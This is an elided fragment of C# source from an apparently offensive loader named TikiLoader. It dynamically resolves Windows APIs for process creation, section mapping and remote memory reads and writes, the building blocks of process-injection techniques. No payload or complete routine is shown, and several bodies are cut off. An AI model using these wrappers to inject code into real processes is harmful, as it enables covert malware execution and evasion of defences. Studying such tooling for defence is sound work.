...
namespace TikiLoader
{
    public class Natives
    {
        ...
        public static bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
                                          IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref Structs.STARTUPINFOEX lpStartupInfo, out Structs.PROCESS_INFORMATION lpProcessInformation)
        {
            IntPtr proc = GetProcAddress(GetKernel32(), "CreateProcessW");
            NativeSysCall.Delegates.CreateProcessW CreateProcessW = (NativeSysCall.Delegates.CreateProcessW)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.CreateProcessW));
        ...
        public static void GetSystemInfo(ref Structs.SYSTEM_INFO lpSysInfo)
        {
        ...
        public static int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize,
                                            IntPtr stuff, ref IntPtr viewSize, int inheritDispo, Enums.AllocationType alloctype, Enums.MemoryProtection prot)
        {
            ...
            return ZwMapViewOfSection(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
        }

        public static int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref Structs.LARGE_INTEGER pMaxSize, Enums.MemoryProtection pageProt, Enums.AllocationType allocationAttribs, IntPtr hFile)
        {
            ...
            return ZwCreateSection(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
        }

        public static int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref Structs.PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen)
        {
            IntPtr proc = GetProcAddress(GetNtDll(), "ZwQueryInformationProcess");
            NativeSysCall.Delegates.ZwQueryInformationProcess ZwQueryInformationProcess = (NativeSysCall.Delegates.ZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.ZwQueryInformationProcess));
            return ZwQueryInformationProcess(hProcess, procInformationClass, ref procInformation, ProcInfoLen, ref retlen);
        }
        ...
        {
            IntPtr proc = GetProcAddress(GetKernel32(), "ReadProcessMemory");
            NativeSysCall.Delegates.ReadProcessMemory ReadProcessMemory = (NativeSysCall.Delegates.ReadProcessMemory)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.ReadProcessMemory));
        ...
        {
            IntPtr proc = GetProcAddress(GetKernel32(), "WriteProcessMemory");
            NativeSysCall.Delegates.WriteProcessMemory WriteProcessMemory = (NativeSysCall.Delegates.WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.WriteProcessMemory));
            return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, out lpNumWritten);
        }

        public static uint ResumeThread(IntPtr hThread)
        {
            IntPtr proc = GetProcAddress(GetKernel32(), "ResumeThread");
            NativeSysCall.Delegates.ResumeThread ResumeThread = (NativeSysCall.Delegates.ResumeThread)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.ResumeThread));
        ...
        public static bool DeleteProcThreadAttributeList(IntPtr lpAttributeList)
        {
            ...
            NativeSysCall.Delegates.DeleteProcThreadAttributeList DeleteProcThreadAttributeList = (NativeSysCall.Delegates.DeleteProcThreadAttributeList)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.DeleteProcThreadAttributeList));
